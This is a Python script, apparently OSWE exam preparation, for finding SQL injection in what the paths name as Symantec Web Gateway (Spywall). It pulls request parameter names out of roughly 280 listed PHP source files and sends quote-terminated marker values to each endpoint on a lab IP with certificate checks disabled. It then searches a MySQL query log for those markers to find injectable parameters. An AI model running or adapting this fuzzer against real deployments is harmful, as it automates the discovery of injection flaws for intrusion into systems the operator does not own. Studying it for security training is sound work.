import re
import requests
import time
from colorama import Fore, Back, Style 
requests.packages.urllib3.\
disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
def format_text(title,item):

    cr = '\r\n'

    section_break = cr + "*" * 20 + cr

    item = str(item)

    text = Style.BRIGHT + Fore.RED + title + Fore.RESET + section_break + item + section_break 
    return text


pattern = re.compile("\$_(GET|POST|REQUEST|SESSION|COOKIE|get|post|request|session|cookie)\[[\'\"](\w+)[\'\"]\]")
# strings = re.

mysql_log_file = "/tmp/hello/log.txt"
#pattern_mysql_1 = re.compile("'[%]?\w+\'[%]?'")
#pattern_mysql_2 = re.compile('"[%]?\w+\'[%]?"')
pattern_mysql = re.compile("['\"][%]?\w+\'[%]?['\"]")


files_to_check='''/addsignature.php
/addtopolicy.php
/admin_advanced.php
/admin_config.php
/admin_messages.php
/admin_status.php
/admin_status_more.php
/admin_updates.php
/alerts.php
/attackreport.php
/authenticate.php
/backup.php
/blacklist.php
/blocked.php
/blocked_file.php
/blocked_url.php
/blockpage_default.php
/block_rules.php
/infected.php
/infectedhelp.php
/infections.php
/internalnetwork.php
/ipchange.php
/ldap_latest.php
/login.php
/logout.php
/releasenotes.php
/repairedclients.php
/repairs.php
/restore.php
/saved_alerts.php
/saved_reports.php
/saved_users.php
/save_and_schedule.php
/save_morpheus_report.php
/save_report.php
/save_report_as.php
/scheduled_backups.php
/schedule_backup.php
/search.php
/sendmail.php
/send_alert.php
/send_backup.php
/send_report.php
/delete_alert.php
/del_blacklist.php
/del_report.php
/del_users.php
/del_whitelist.php
/dept.php
/disclaimerhandler.php
/download_file.php
/edit_alert.php
/edit_blacklist.php
/edit_sysalert.php
/edit_whitelist.php
/unblock.php
/uploader.php
/user.php
/unauthorized_page.php
/emailreport.php
/eula.php
/executive_summary.php
/exportall.php
/exportreport.php
/export_custom_report.php
/export_executive_summary.php
/export_feedback_report.php
/feedback.php
/feedback_report.php
/first_user.php
/forget.php
/forgot.php
/help/addtopolicy.php
/help/admin_advanced.php
/help/admin_config.php
/help/admin_messages.php
/help/admin_status.php
/help/admin_updates.php
/help/attackreport.php
/help/blacklist.php
/help/block_rules.php
/help/categories.php
/help/policy_config.php
/help/repairedclients.php
/help/repairs.php
/help/reportnavigation.php
/help/reportoptions.php
/help/saved_alerts.php
/help/whitelist.php
/help/edit_alert.php
/help/edit_blacklist.php
/help/edit_sysalert.php
/help/emailreport.php
/help/executive_summary.php
/help/feedback.php
/help/feedback_report.php
/help/helpfooter.php
/help/category.php
/help/helpheader.php
/help/techsupport.php
/help/thanks.php
/help/unblock.php
/help/user.php
/help/userlevel.php
/help/user_report.php
/help/vlan.php
/help/host_spy_report.php
/help/infections.php
/help/internalnetwork.php
/help/new_blacklist.php
/help/new_user.php
/help/new_whitelist.php
/help/nohelp.php
/help/change_details.php
/help/clientreport.php
/help/config_highlights.php
/help/custom_report.php
/help/deletebutton.php
/help/dept.php
/help/editbutton.php
/help/saved_reports.php
/help/saved_users.php
/help/save_report.php
/help/scheduled_backups.php
/help/schedule_backup.php
/help/search.php
/help/setpath.php
/help/severities.php
/help/showfixed.php
/help/spyware.php
/help/spywaredetected.php
/help/staticroute.php
/help/systemchanges.php
/host_spy_report.php
/includes/language.php
/includes/left.php
/includes/left_nav.php
/includes/listpolicies.php
/includes/logger.php
/includes/mail.php
/includes/mail_functions.php
/includes/paging.php
/includes/prepare_executive_summary_graph_data.php
/includes/prepare_paging.php
/includes/class.phpmailer.php
/includes/clientdata.php
/includes/create_custom_report_query.php
/includes/csvsubreport.php
/includes/customreportdata.php
/includes/date_filter.php
/includes/date_functions.php
/includes/dbutils.php
/includes/spywall_os.php
/includes/spywaredetectedquery.php
/includes/spyware_data.php
/includes/status_reportheader.php
/includes/subreport.php
/includes/systemchanges_data.php
/includes/systemrestore.php
/includes/tabs.php
/includes/unlinkedsubreport.php
/includes/updateuser.php
/includes/user_level.php
/includes/user_report_data.php
/includes/util_functions.php
/includes/validate_alert.php
/includes/wizardheader.php
/includes/ciu_no_local.php
/includes/db_record_functions.php
/includes/feedback_query.php
/includes/spywall_api.php
/includes/filterpane.php
/includes/footer.php
/includes/graph_my.php
/includes/gridreport.php
/includes/header.php
/includes/helpframe.php
/includes/hostspyquery.php
/includes/infections_data.php
/includes/actionreport.php
/includes/admin_status_all.php
/includes/admin_status_resync.php
/includes/app_reportheader.php
/includes/attackreportquery.php
/includes/benchmark.php
/includes/category_data.php
/includes/changelog.php
/includes/ciu_all_local.php
/includes/ciu_ha.php
/includes/ciu_no_all.php
/includes/recordsperpage.php
/includes/repairedclientsdata.php
/includes/repairs_data.php
/includes/reportheader.php
/includes/reportmenu.php
/includes/report_functions.php
/includes/safeweb.php
/includes/session_ck.php
/includes/setfilterdates.php
/includes/setpath.php
/includes/showuser.php
/includes/signature_data.php
/includes/signature_header.php
/includes/smtp.php
/includes/dept_data.php
/includes/executive_summary_data.php
/includes/executive_summary_graph.php
/includes/executive_summary_traffic.php
/includes/export.php
/network.php
/new_blacklist.php
/new_user.php
/new_whitelist.php
/notinfected.php
/pbcontrol.php
/percentage.php
/policy_config.php
/prepare_executive_summary_graph_data.php
/setpath.php
/showfixed.php
/show_blacklist.php
/show_users.php
/show_whitelist.php
/spyware.php
/spywaredetected.php
/spywareinfo.php
/staticroute.php
/systemchanges.php
/temppassword.php
/thanks.php
/timer.php
/category.php
/change_details.php
/class/setpath.php
/cleaner.php
/cleaninghelp.php
/clientreport.php
/config/conf.php
/config/db.php
/config/language.php
/config/msg.php
/config/tc.php
/copyright.php
/createcase.php
/custom_report.php
/db_error.php
/user_interface.php
/user_report.php
/vlan.php
/whitelist.php'''

#files_to_check='''/mods/_standard/social/index_public.php'''





for current_file in files_to_check.splitlines():
    get_var = {}
    post_var = {}
    print(current_file)
    complement=current_file.split("/")[len(current_file.split("/"))-1].split(".")[0]
    
    for i, line in enumerate(open('/media/deo-gracias/Data/Pen/OSWE/symantec_code'+current_file,  encoding="utf8", errors='ignore')):
        #print('/media/deo-gracias/Data/Pen/OSWE/symantec_code'+current_file)
        for match in re.finditer(pattern, line):
            parameter_method = match.group(1)
            parameter_var = match.group(2)
            #print("hello " + current_file.split("/")[len(current_file.split("/"))-1].split(".")[0])
            #input()

            if (parameter_method.upper() == 'GET'):
                if not (parameter_var in get_var.keys()):
                    get_var.update({parameter_var:parameter_var+"_"+complement+"'"})
                    file_object = open('/tmp/payload_req.txt', 'a')
                    file_object.write(parameter_var+"_"+complement+"'\n")
                    file_object.close()

            elif (parameter_method.upper() == 'POST'):
                if not (parameter_var in post_var.keys()):
                    post_var.update({parameter_var:parameter_var+"_"+complement+"'"})
                    file_object = open('/tmp/payload_req.txt', 'a')
                    file_object.write(parameter_var+"_"+complement+"'\n")
                    file_object.close()

            elif (parameter_method.upper() == 'SERVER' or parameter_method.upper() == 'SESSION' or parameter_method.upper() == 'COOKIE'):
                if not (parameter_var in post_var.keys()):
                    post_var.update({parameter_var:parameter_var+"_"+complement+"'"})
                    file_object = open('/tmp/payload_req.txt', 'a')
                    file_object.write(parameter_var+"_"+complement+"'\n")
                    file_object.close()
                if not (parameter_var in get_var.keys()):
                    get_var.update({parameter_var:parameter_var+"_"+complement+"'"})
                    file_object = open('/tmp/payload_req.txt', 'a')
                    file_object.write(parameter_var+"_"+complement+"'\n")
                    file_object.close()

            print('Found on line %s: method: %s variable: %s' % (i+1, parameter_method, parameter_var))




    #print("post var is ")
    #print(post_var)

    try:
        r = requests.post('https://192.168.5.142/spywall'+current_file, params=post_var, verify=False)

        #print(format_text('r.status_code is: ',r.status_code))
        #print(format_text('r.headers is: ',r.headers))


        #print(format_text('r.cookies is: ',r.cookies))
        #print(format_text('r.text is: ',r.text))


        #print("get var is ")
        #print(get_var)
    except:
        continue

    try:
        r = requests.get('https://192.168.5.142/spywall'+current_file, params=get_var, verify=False)

        #print(format_text('r.status_code is: ',r.status_code))
        #print(format_text('r.headers is: ',r.headers))


        #print(format_text('r.cookies is: ',r.cookies))
        #print(format_text('r.text is: ',r.text))
        #time.sleep(1)
    except:
        continue



for i, line in enumerate(open(mysql_log_file)):
    for match in re.finditer(pattern_mysql, line):    
        print('Found on line %s: %s' % (i+1, match.group()))


